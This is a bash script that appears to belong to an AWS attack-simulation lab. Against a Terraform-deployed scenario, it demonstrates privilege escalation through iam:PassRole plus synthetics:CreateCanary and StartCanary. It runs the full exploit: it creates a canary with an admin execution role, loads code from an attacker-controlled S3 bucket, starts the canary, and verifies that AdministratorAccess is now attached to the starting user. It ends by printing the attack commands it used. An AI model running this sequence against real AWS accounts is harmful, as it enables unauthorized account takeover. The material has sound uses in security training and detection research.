#!/bin/bash

# Demo script for synthetics-001 privilege escalation
# This scenario demonstrates how a user with iam:PassRole, synthetics:CreateCanary, and
# synthetics:StartCanary can escalate privileges by creating a CloudWatch Synthetics canary
# with malicious code (pre-staged in an attacker-controlled S3 bucket) and an admin execution
# role that grants the starting user admin access

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
CANARY_NAME="pl-prod-synth-001-privesc"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Synthetics CreateCanary Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_synthetics_001_iam_passrole_synthetics_createcanary_synthetics_startcanary.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials and resource info from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
STARTING_USER=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_name')
ADMIN_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_arn')
ADMIN_ROLE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.admin_role_name')
S3_BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.s3_bucket_name')
ATTACKER_BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.attacker_bucket_name')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Retrieve readonly credentials for observation steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Admin Role: $ADMIN_ROLE_NAME"
echo "Artifact Bucket: $S3_BUCKET_NAME"
echo "Attacker Bucket: $ATTACKER_BUCKET_NAME"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# [EXPLOIT] Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Verifying starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [OBSERVATION] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying starting user doesn't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Note about pre-staged exploit code
echo -e "${YELLOW}Step 5: Retrieving pre-staged canary exploit code location${NC}"
echo ""
echo -e "${BLUE}ℹ Attack Simulation Note:${NC}"
echo -e "${BLUE}  The malicious canary Python script is hosted in an attacker-controlled S3 bucket.${NC}"
echo -e "${BLUE}  The bucket policy grants the prod account s3:GetObject access (via resource policy).${NC}"
echo -e "${BLUE}  If an attacker account is configured, this bucket lives in a separate AWS account.${NC}"
echo ""
echo "Attacker bucket: $ATTACKER_BUCKET_NAME"
echo "Exploit code key: canary-code/canary.zip"
echo -e "${GREEN}✓ Retrieved exploit code location from Terraform${NC}\n"

# [EXPLOIT] Step 6: Create the malicious canary (PRIVILEGE ESCALATION - Part 1)
use_starting_creds
echo -e "${YELLOW}Step 6: Creating CloudWatch Synthetics canary with admin execution role${NC}"
echo "Canary name: $CANARY_NAME"
echo "Execution role: $ADMIN_ROLE_ARN"
echo "Artifact bucket: s3://$S3_BUCKET_NAME"
echo "Code source: s3://$ATTACKER_BUCKET_NAME/canary-code/canary.zip"
echo ""
echo "This is the privilege escalation vector - creating a canary that runs with admin privileges..."

show_attack_cmd "Attacker" "aws synthetics create-canary --region $AWS_REGION --name $CANARY_NAME --code 'S3Bucket=${ATTACKER_BUCKET_NAME},S3Key=canary-code/canary.zip,Handler=my_script.handler' --artifact-s3-location 's3://$S3_BUCKET_NAME' --execution-role-arn $ADMIN_ROLE_ARN --runtime-version syn-python-selenium-8.0 --schedule '{\"Expression\":\"rate(0 minute)\",\"DurationInSeconds\":0}' --run-config '{\"TimeoutInSeconds\":60,\"MemoryInMB\":960,\"EnvironmentVariables\":{\"TARGET_USER\":\"$STARTING_USER\"}}'"
CREATE_RESULT=$(aws synthetics create-canary \
    --region $AWS_REGION \
    --name "$CANARY_NAME" \
    --code "S3Bucket=${ATTACKER_BUCKET_NAME},S3Key=canary-code/canary.zip,Handler=my_script.handler" \
    --artifact-s3-location "s3://$S3_BUCKET_NAME" \
    --execution-role-arn "$ADMIN_ROLE_ARN" \
    --runtime-version "syn-python-selenium-8.0" \
    --schedule '{"Expression":"rate(0 minute)","DurationInSeconds":0}' \
    --run-config "{\"TimeoutInSeconds\":60,\"MemoryInMB\":960,\"EnvironmentVariables\":{\"TARGET_USER\":\"$STARTING_USER\"}}" \
    --output json 2>&1)

if [ $? -eq 0 ]; then
    CANARY_STATE=$(echo "$CREATE_RESULT" | jq -r '.Canary.Status.State')
    echo "Canary state: $CANARY_STATE"
    echo -e "${GREEN}✓ Successfully created canary!${NC}"
else
    echo -e "${RED}Error: Failed to create canary${NC}"
    echo "$CREATE_RESULT"
    exit 1
fi
echo ""

# [OBSERVATION] Step 7: Wait for canary to reach READY state
echo -e "${YELLOW}Step 7: Waiting for canary to reach READY state${NC}"
echo "Polling canary status every 15 seconds (timeout: 5 minutes)..."
use_readonly_creds

MAX_WAIT=300
ELAPSED=0
POLL_INTERVAL=15

while [ $ELAPSED -lt $MAX_WAIT ]; do
    show_cmd "ReadOnly" "aws synthetics get-canary --region $AWS_REGION --name $CANARY_NAME --query 'Canary.Status.State' --output text"
    CANARY_STATE=$(aws synthetics get-canary \
        --region $AWS_REGION \
        --name "$CANARY_NAME" \
        --query 'Canary.Status.State' \
        --output text 2>/dev/null)

    echo "Canary state: $CANARY_STATE (${ELAPSED}s elapsed)"

    if [ "$CANARY_STATE" == "READY" ]; then
        echo -e "${GREEN}✓ Canary is READY${NC}\n"
        break
    fi

    if [ "$CANARY_STATE" == "ERROR" ]; then
        echo -e "${RED}Error: Canary entered ERROR state${NC}"
        CANARY_STATE_REASON=$(aws synthetics get-canary \
            --region $AWS_REGION \
            --name "$CANARY_NAME" \
            --query 'Canary.Status.StateReason' \
            --output text 2>/dev/null)
        echo "Reason: $CANARY_STATE_REASON"
        exit 1
    fi

    sleep $POLL_INTERVAL
    ELAPSED=$((ELAPSED + POLL_INTERVAL))
done

if [ $ELAPSED -ge $MAX_WAIT ]; then
    echo -e "${RED}Error: Timed out waiting for canary to reach READY state${NC}"
    exit 1
fi

# [EXPLOIT] Step 8: Start the canary (PRIVILEGE ESCALATION - Part 2)
use_starting_creds
echo -e "${YELLOW}Step 8: Starting the canary to execute malicious code${NC}"
echo "Starting canary: $CANARY_NAME"

show_attack_cmd "Attacker" "aws synthetics start-canary --region $AWS_REGION --name $CANARY_NAME"
aws synthetics start-canary \
    --region $AWS_REGION \
    --name "$CANARY_NAME" 2>&1

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Canary started successfully${NC}"
else
    echo -e "${RED}Error: Failed to start canary${NC}"
    exit 1
fi
echo ""

# [OBSERVATION] Step 9: Wait for canary run to complete
echo -e "${YELLOW}Step 9: Waiting for canary run to complete${NC}"
echo "Polling canary runs every 15 seconds (timeout: 5 minutes)..."
use_readonly_creds

MAX_WAIT=300
ELAPSED=0
POLL_INTERVAL=15
RUN_COMPLETED=false

while [ $ELAPSED -lt $MAX_WAIT ]; do
    sleep $POLL_INTERVAL
    ELAPSED=$((ELAPSED + POLL_INTERVAL))

    show_cmd "ReadOnly" "aws synthetics get-canary-runs --region $AWS_REGION --name $CANARY_NAME --max-results 1 --output json"
    RUN_OUTPUT=$(aws synthetics get-canary-runs \
        --region $AWS_REGION \
        --name "$CANARY_NAME" \
        --max-results 1 \
        --output json 2>/dev/null)

    RUN_COUNT=$(echo "$RUN_OUTPUT" | jq -r '.CanaryRuns | length')

    if [ "$RUN_COUNT" == "0" ] || [ -z "$RUN_COUNT" ]; then
        echo "No runs yet... (${ELAPSED}s elapsed)"
        continue
    fi

    RUN_STATUS=$(echo "$RUN_OUTPUT" | jq -r '.CanaryRuns[0].Status.State')
    echo "Run status: $RUN_STATUS (${ELAPSED}s elapsed)"

    if [ "$RUN_STATUS" == "PASSED" ]; then
        echo -e "${GREEN}✓ Canary run completed successfully (PASSED)${NC}\n"
        RUN_COMPLETED=true
        break
    elif [ "$RUN_STATUS" == "FAILED" ]; then
        echo -e "${YELLOW}Canary run FAILED - the malicious code may still have executed before failing${NC}"
        RUN_REASON=$(echo "$RUN_OUTPUT" | jq -r '.CanaryRuns[0].Status.StateReason')
        echo "Reason: $RUN_REASON"
        echo "Continuing to check if the privilege escalation succeeded..."
        echo ""
        RUN_COMPLETED=true
        break
    fi
done

if [ "$RUN_COMPLETED" != "true" ]; then
    echo -e "${RED}Error: Timed out waiting for canary run to complete${NC}"
    exit 1
fi

# Step 10: Wait for IAM policy propagation
echo -e "${YELLOW}Step 10: Waiting for IAM policy to propagate${NC}"
echo "IAM changes can take time to propagate..."
sleep 15
echo -e "${GREEN}✓ Policy should be propagated${NC}\n"

# [OBSERVATION] Step 11: Verify privilege escalation
echo -e "${YELLOW}Step 11: Verifying privilege escalation${NC}"
use_readonly_creds

# First check that the policy was attached
echo "Checking attached policies on starting user..."
show_cmd "ReadOnly" "aws iam list-attached-user-policies --user-name $STARTING_USER --output table"
ATTACHED_POLICIES=$(aws iam list-attached-user-policies \
    --user-name "$STARTING_USER" \
    --output json 2>/dev/null)

if echo "$ATTACHED_POLICIES" | jq -r '.AttachedPolicies[].PolicyArn' | grep -q "AdministratorAccess"; then
    echo -e "${GREEN}✓ AdministratorAccess policy is attached to $STARTING_USER${NC}"
else
    echo -e "${RED}✗ AdministratorAccess policy not found on $STARTING_USER${NC}"
    echo "The canary execution may have failed."
    exit 1
fi
echo ""

# Now verify admin access
echo "Attempting to list IAM users with readonly credentials..."
show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    echo -e "${YELLOW}Note: IAM propagation can take longer than expected. Try waiting 30 more seconds and test again.${NC}"
fi
echo ""

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:PassRole + synthetics:CreateCanary + synthetics:StartCanary)"
echo "2. Used pre-staged malicious canary script from attacker-controlled S3 bucket"
echo "3. Created CloudWatch Synthetics canary with admin execution role: $ADMIN_ROLE_NAME"
echo "4. Started canary to execute malicious code with admin privileges"
echo "5. Canary attached AdministratorAccess to $STARTING_USER"
echo "6. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER"
echo -e "  -> (synthetics:CreateCanary + iam:PassRole) -> Canary with $ADMIN_ROLE_NAME"
echo -e "  -> (synthetics:StartCanary) -> Executes with admin privileges"
echo -e "  -> (iam:AttachUserPolicy) -> AdministratorAccess -> Admin"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- CloudWatch Synthetics canary: $CANARY_NAME"
echo "- Attached policy: AdministratorAccess on $STARTING_USER"
echo "- Canary Lambda function: cwsyn-$CANARY_NAME-* (created by Synthetics service)"

echo -e "\n${RED}Warning: AdministratorAccess policy is attached to $STARTING_USER${NC}"
echo -e "${RED}Warning: A Synthetics canary and its Lambda function exist in the account${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
